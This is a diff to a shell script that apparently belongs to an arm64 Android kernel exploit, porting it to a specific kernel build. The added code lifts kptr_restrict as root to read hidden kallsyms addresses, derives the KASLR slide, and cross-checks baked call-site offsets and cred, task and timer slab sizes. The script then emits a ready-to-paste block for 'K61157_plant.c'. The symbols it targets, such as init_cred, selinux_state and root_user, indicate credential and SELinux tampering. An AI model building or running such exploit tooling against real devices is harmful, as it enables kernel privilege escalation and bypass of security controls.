@@ -12,14 +12,20 @@
 #
 # The script:
 #   1. verifies uname -r matches the target release,
-#   2. pins the KASLR slide against three GhostLock-measured image
-#      offsets (aborts on disagreement — different kernel build),
+#   2. lifts kptr_restrict if /proc/kallsyms addresses are zeroed
+#      (this build ships kptr_restrict=2, which hides them even from
+#      uid 0 - measured in the 2026-11-12 probe bundle), pins the KASLR
+#      slide against three GhostLock-measured image offsets (aborts on
+#      disagreement - different kernel build) and restores the sysctl,
 #   3. extracts panic_on_warn / root_user / init_user_ns / init_ucounts /
 #      init_groups from kallsyms into the port base frame,
 #   4. runs an embedded static arm64 prober (one CPU posix timer + one
 #      fork) under the kmem_cache_alloc tracer and recovers the
 #      do_timer_create / dup_task_struct call sites and the slab sizes,
-#   5. prints the ready-to-paste block for exploit/src/K61157_plant.c and
+#   5. cross-checks the low21s baked from the 2026-11-12 probe bundle
+#      (aborts on mismatch - that would mean a different kernel build),
+#   6. cross-checks the prefilled SELINUX_STATE_STATIC against kallsyms,
+#   7. prints the ready-to-paste block for exploit/src/K61157_plant.c and
 #      the slab defines for the X6873_61157 branch of plant_core.inc.
 #
 # Portability: pure shell (mksh/toybox/dash/bash), no awk/sed/python.
@@ -46,6 +52,7 @@ A_SELINUX_ENFORCING=0x225b820
 WORK="${X6873_WORK:-/data/local/tmp/x6873_derive}"
 KS="${X6873_KALLSYMS:-/proc/kallsyms}"
 SLABINFO="${X6873_SLABINFO:-/proc/slabinfo}"
+KPTR_FILE="${X6873_KPTR:-/proc/sys/kernel/kptr_restrict}"
 TR="${X6873_TRACEFS:-}"
 UNAME_R="${X6873_RELEASE:-$(uname -r)}"
 PROBE_BIN="${X6873_PROBE:-}"          # test hook: use a mock prober
@@ -89,7 +96,44 @@ sym() {
     printf '%s' "$addr"
 }
 
-RT_init_task=$(sym init_task)      || true
+# kptr_restrict=2 zeroes kallsyms for EVERY reader, uid 0 included
+# (probe bundle 2026-11-12: root kallsyms 0/14 visible). Real addresses
+# are mandatory below; lift the sysctl as root just for the reads and
+# restore immediately (trap-guarded for abnormal exits).
+# (X6873_KPTR overrides the sysctl path for offline mock tests.)
+KPTR_SAVED=""
+kptr_restore() {
+    if [ -n "$KPTR_SAVED" ]; then
+        printf '%s' "$KPTR_SAVED" > "$KPTR_FILE" 2>/dev/null
+        KPTR_SAVED=""
+    fi
+    return 0
+}
+trap 'kptr_restore' EXIT
+
+zero_addr() {
+    case "$1" in
+    "" | 0000000000000000) return 0 ;;
+    esac
+    return 1
+}
+
+RT_init_task=$(sym init_task) || true
+if zero_addr "$RT_init_task"; then
+    [ "$(id -u)" = "0" ] || \
+        die "kallsyms addresses are hidden (kptr_restrict) and not root - run under su (PATH B)"
+    [ -r "$KPTR_FILE" ] || die "$KPTR_FILE is not readable"
+    KPTR_SAVED=$(cat "$KPTR_FILE" 2>/dev/null)
+    printf '%s' 0 > "$KPTR_FILE" 2>/dev/null || \
+        die "cannot write $KPTR_FILE (SELinux or sysctl lockdown from this context)"
+    RT_init_task=$(sym init_task) || true
+    if zero_addr "$RT_init_task"; then
+        kptr_restore
+        die "kallsyms still zeroed with kptr_restrict=0 - unexpected lockdown"
+    fi
+    say "[ok] kptr_restrict lifted ($KPTR_SAVED -> 0) for the kallsyms reads"
+fi
+
 RT_init_cred=$(sym init_cred)      || true
 RT_root_task_group=$(sym root_task_group) || true
 RT_selinux_state=$(sym selinux_state)     || true
@@ -98,9 +142,15 @@ RT_root_user=$(sym root_user)             || true
 RT_init_user_ns=$(sym init_user_ns)       || true
 RT_init_ucounts=$(sym init_ucounts)       || true
 RT_init_groups=$(sym init_groups)         || true
+kptr_restore
 
-[ -n "$RT_init_task" ] && [ -n "$RT_init_cred" ] && [ -n "$RT_root_task_group" ] ||
-    die "kallsyms anchor symbols missing (init_task/init_cred/root_task_group) — wrong kallsyms?"
+# zeroed anchors would pin a garbage slide - fail loudly instead.
+for _a in init_task init_cred root_task_group; do
+    eval "_v=\$RT_$_a"
+    if zero_addr "$_v"; then
+        die "kallsyms anchor $_a has no real address (got '${_v:-empty}') - refusing to derive a slide"
+    fi
+done
 
 # slide (mod 2^32) from each anchor; all must agree.
 slide_of() { # $1 = runtime hex, $2 = image offset
@@ -272,6 +322,26 @@ LOW21_TASK=$(( OFF_TASK & 0x1fffff ))
 
 say "[ok] timer site : $(hexaddr "$OFF_TIMER") (low21 $(printf '0x%x' "$LOW21_TIMER"))"
 say "[ok] copy site  : $(hexaddr "$OFF_TASK") (low21 $(printf '0x%x' "$LOW21_TASK"))"
+
+# ------------------------------------------- 5b. cross-check baked values
+# K61157_plant.c bakes timer_low21=0x19feb0 and copy_low21=0xac148 from
+# the 2026-11-12 probe bundle (139/139 + 29/29 events). A mismatch means
+# this device now runs a different kernel build than the bundle came
+# from - stop instead of emitting a self-inconsistent profile.
+BAKED_TIMER_LOW21=$(( 0x19feb0 ))
+BAKED_COPY_LOW21=$(( 0xac148 ))
+if [ "$LOW21_TIMER" -ne "$BAKED_TIMER_LOW21" ] || [ "$LOW21_TASK" -ne "$BAKED_COPY_LOW21" ]; then
+    die "low21 mismatch vs the baked probe-bundle values: timer 0x$(printf '%x' "$LOW21_TIMER") vs 0x$(printf '%x' "$BAKED_TIMER_LOW21"), copy 0x$(printf '%x' "$LOW21_TASK") vs 0x$(printf '%x' "$BAKED_COPY_LOW21") - different kernel build?"
+fi
+say "[ok] prober low21s match the baked probe-bundle values (0x19feb0 / 0xac148)"
+
+# slab sizes cross-check (same bundle): 0x108/0x140, 0xb0/0xc0, 0x12c0/0x12c0
+[ "$(printf '%x' "$TIMER_REQ_V")" = "108" ] && [ "$(printf '%x' "$TIMER_ALLOC_V")" = "140" ] || \
+    say "[warn] timer slab sizes differ from the bundle (now $(printf '0x%x' "$TIMER_REQ_V")/$(printf '0x%x' "$TIMER_ALLOC_V"), bundle 0x108/0x140)"
+[ "$(printf '%x' "$CRED_REQ_V")" = "b0" ] && [ "$(printf '%x' "$CRED_ALLOC_V")" = "c0" ] || \
+    say "[warn] cred slab sizes differ from the bundle (now $(printf '0x%x' "$CRED_REQ_V")/$(printf '0x%x' "$CRED_ALLOC_V"), bundle 0xb0/0xc0)"
+[ "$(printf '%x' "$TASK_REQ_V")" = "12c0" ] && [ "$(printf '%x' "$TASK_ALLOC_V")" = "12c0" ] || \
+    say "[warn] task slab sizes differ from the bundle (now $(printf '0x%x' "$TASK_REQ_V")/$(printf '0x%x' "$TASK_ALLOC_V"), bundle 0x12c0/0x12c0)"
 
 # ------------------------------------------------------------- 6. output
 emit_sym() { # $1 = RT_ variable name
